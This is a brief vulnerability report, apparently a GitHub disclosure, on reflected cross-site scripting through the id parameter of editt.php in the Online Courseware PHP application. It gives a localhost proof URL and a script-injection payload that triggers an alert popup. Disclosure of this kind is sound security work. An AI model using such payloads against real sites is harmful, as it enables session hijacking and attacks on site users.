#### BUG_AUTHOR:LIU WEIYU
## Online Courseware – reflected XSS on (editt.php?id=XX) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
editt.php?id=XX 

On this page,id parameter is vulnerable to reflected XSS Attack 
### Proof of vulnerability:
#### Visit this page：
http://localhost/onlinecourseware/pcci/admin/editt.php?id=1
### Payload：
“></script><script>alert(1)</script>
### Trigger popup：
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/7572dd29-98be-4490-9294-2713464da72b">
